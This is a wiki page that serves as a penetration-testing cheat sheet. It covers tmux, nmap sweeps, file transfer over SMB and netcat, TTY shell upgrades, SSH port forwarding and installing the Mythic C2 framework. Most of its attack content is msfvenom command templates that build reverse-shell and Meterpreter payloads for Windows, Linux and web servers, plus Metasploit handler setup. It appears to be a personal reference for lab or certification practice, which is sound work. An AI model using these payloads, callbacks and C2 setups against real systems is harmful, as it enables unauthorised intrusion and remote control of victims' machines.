---
layout: single
title: "Wiki"
sidebar:
    nav: wiki-navigation
classes: wide
permalink: /wiki
---

# TMUX
## tmux commands

```
tmux: opens tmux
PREFIX + c: creates new pane
PREFIX + p: jump back a pane
PREFIX + #: jump to a certain pane based on number
PREFIX + .: move a pane
PREFIX + x: delete a pane
PREFIX + ,: rename a pane
PREFIX + $: rename a window
PREFIX + D: detach from tmux session
  > tmux attach -t 0: get back into tmux
PREFIX + %: split pane vertically
PREFIX + ": split pane horizontally
```

## tmux essentials

```
tmux attach -t <name>: attach back into a session
tmux new -s <name>: create new tmux session
tmux source-file ~/.tmux.conf: reload .tmux.conf
tmux ls: show all tmux sessions
```

## tmux-logging

```
Logging: prefix + shift + p
Screen capture: prefix + alt + p
Save all history: prefix + alt + shift + p
Clear pane history: prefix + alt + c
```

# NMAP

## find nmap scripts

```
locate <service/keyword> | grep .nse$
  > locate http- | grep .nse$
locate *.nse | grep <service/keyword>
```

## network sweep
```
nmap -sn <IP block>
```

```
sudo arp-scan --interface=eth0 192.168.182.0/24
```

# FILE TRANSFER

## smb

```
smbserver.py -smb2support <share name> .
KALI to WINDOWS: copy \\<SMB IP>\<folder>\<file> C:\<file location>
WINDOWS to KALI: copy <file> \\<SMB IP>\<folder>\<file>

Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All if sharing doesn't work. Restart required
**set-executionpolicy remotesigned to enable running scripts
```

## nc

```
RECIEVING END: nc -l -p <port> > <file>
SENDING END: nc -w 3 <IP> <port> < lse1.txt
```

## python

```
Python 2: python -m SimpleHTTPServer <port>
Python 3: python -m http.server <port>
  > --directory </path/to/directory>
  > --bind <specific IP>
```

# FULL FUNCTONING SHELL
## spawn tty shell

```
which python
  > ls /usr/bin | grep python
  > apt list --installed | grep python
  > dpkg -l | grep python
python -c 'import pty; pty.spawn("/bin/bash")' OR python3 -c 'import pty; pty.spawn("/bin/bash")'

CTRL + Z to put terminal in the background
echo $TERM (copy the value)
stty raw -echo; fg
reset
  > paste $TERM value
```

# PORT FORWARDING
## ssh port forwarding

**DO THIS ON THE MACHINE THAT YOU WANT TO PORT FORWARD TO (AKA YOUR HOST)**

```
ssh -L <local port>:<local IP>:<remote port> <remote user>@<remote domain/ip>
```

# INSTALLATIONS

## C2

### Mythic

```
git clone https://github.com/its-a-feature/Mythic
sudo ./mythic-cli mythic start
sudo nano .env (if you want to edit the configuration)

./install_docker_ubuntu
sudo ./mythic-cli mythic start
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
sudo ./mythic-cli install github https://github.com/MythicAgents/Medusa.git
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http.git
```

### Covenant

```

```

## jVis

```

```

## Docker

```
DOCKER
printf "%s\n" "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-ce-archive-keyring.gpg] https://download.docker.com/linux/debian buster stable" | sudo tee /etc/apt/sources.list.d/docker-ce.list
curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/docker-ce-archive-keyring.gpg
sudo apt install docker-ce docker-ce-cli

DOCKER-COMPOSE
sudo curl -L "https://github.com/docker/compose/releases/download/2.1.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose (if docker-compose no worky)
```

# AutoRecon

```
autorecon <IP 1> <IP 2> -o <output location>
  > autorecon <hostname 1>
  > autorecon <IP block/24>
  > autorecon -t <target file>
```

# METASPLOIT

## msfvenom

### Non-Meterpreter

#### **Windows**

```
STAGED
x86: msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

```
STAGELESS
x86: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### **Linux**

```
STAGED
x86: msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64: msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

```
STAGELESS
x86: msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64: msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### **Web**

```
asp: msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
jsp: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
war: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
php: msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

### Meterpreter

#### Windows

```
STAGED
x86: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

```
STAGELESS
x86: msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exee
x64: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Linux

```
STAGED
x86: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

```
STAGELESS
x86: msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64: msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### Web

```
asp: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
jsp: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
war: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war
php: msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

To use meterpreter shells make sure to: 

```
use exploit/multi/handler
set payload <payload>
  > set payload windows/shell/reverse_tcp

run post/multi/recon/local_exploit_suggester
```
